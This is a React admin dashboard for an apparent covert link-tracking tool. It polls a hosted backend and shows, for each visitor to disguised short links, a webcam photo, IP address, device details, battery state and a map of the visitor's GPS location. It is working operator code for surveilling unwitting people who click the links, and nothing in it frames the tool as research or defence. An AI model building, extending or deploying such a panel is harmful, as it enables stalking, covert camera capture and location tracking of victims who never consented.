import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";

export default function AdminPanel() {
  const { shortId } = useParams();

  // State Management
  const [stats, setStats] = useState([]); // Master list of all tracking URLs
  const [selectedShortId, setSelectedShortId] = useState(null); // Track which URL is being viewed

  useEffect(() => {
    const fetchData = () => {
      fetch(`https://user-tracking-1.onrender.com/api/auth/analytics/${shortId}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.logs) {
            setStats(data.logs);
          }
        })
        .catch((err) => console.error("Error fetching data:", err));
    };

    fetchData();
    const interval = setInterval(fetchData, 2000); // Polling every 2 seconds

    return () => clearInterval(interval);
  }, [shortId]);

  // Derived Data: Find the data for the URL currently being viewed
  const activeEntry = stats.find((item) => item.shortId === selectedShortId);
  const visitorLogs = activeEntry ? activeEntry.analytics : [];

  return (
    <div className="admin-container">
      <h1>Admin Dashboard</h1>
      
      <div className="table-container">
        <h3>Tracking URLs Overview</h3>
        <table border="1" width="100%" style={{ borderCollapse: "collapse", textAlign: "left" }}>
          <thead>
            <tr>
              <th>Tracking URL</th>
              <th>Destination URL</th>
              <th>Visitors Count</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            {stats.length > 0 ? (
              stats.map((item, index) => (
                <tr key={index}>
                  <td>{`https://user-tracking-ebon.vercel.app/t/${item.shortId}`}</td>
                  <td>{item.destinationUrl}</td>
                  <td>{item.analytics?.length || 0}</td>
                  <td>
                    <button onClick={() => setSelectedShortId(item.shortId)}>
                      {selectedShortId === item.shortId ? "Viewing..." : "View Details"}
                    </button>
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="4" style={{ textAlign: "center", padding: "10px" }}>Loading stats...</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* VISITOR DETAILS SECTION */}
      {selectedShortId && (
        <div className="user-details"  >
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
             <button onClick={() => setSelectedShortId(null)}  >
              ✕ Close Details
            </button>
          </div>

          {visitorLogs.length > 0 ? (
            visitorLogs.map((log, index) => (
              <div key={index} className="device-box" style={{ borderBottom: "1px solid #ddd", marginBottom: "20px", paddingBottom: "10px" }}>
                
                
                <div>
                  <div>
                    <h4>Camera Capture</h4>
                    {log.cameraImage ? (
                      <img src={log.cameraImage} alt="User" width="250" style={{ borderRadius: "8px" }} />
                    ) : (
                      <p>No Image Captured</p>
                    )}
                  </div>

                  <div>
                    <h4>Device Info</h4>
                    <p><b>IP:</b> {log.ip}</p>
                    <p><b>Browser:</b> {log.browser}</p>
                    <p><b>Platform:</b> {log.platform}</p>
                    <p><b>Screen:</b> {log.screen}</p>
                    <p><b>RAM:</b> {log.ram} GB</p>
                    <p><b>CPU:</b> {log.cpuCores} Cores</p>
                    <p><b>Battery:</b> {log.batteryLevel}% ({log.isCharging ? "Charging" : "Unplugged"})</p>
                    <p><b>Captured At:</b> {new Date(log.timestamp).toLocaleString()}</p>
                  </div>
                </div>

                <h4>Location Map</h4>
                {log.latitude && log.longitude ? (
                  
              <iframe
                title="location"
                width="100%"
                height="300"
                src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&z=15&output=embed`}
              ></iframe>
                ) : (
                  <p>Location data not available for this visitor.</p>
                )}
              </div>
            ))
          ) : (
            <p>No visitor logs found for this specific tracking URL.</p>
          )}
        </div>
      )}
    </div>
  );
}
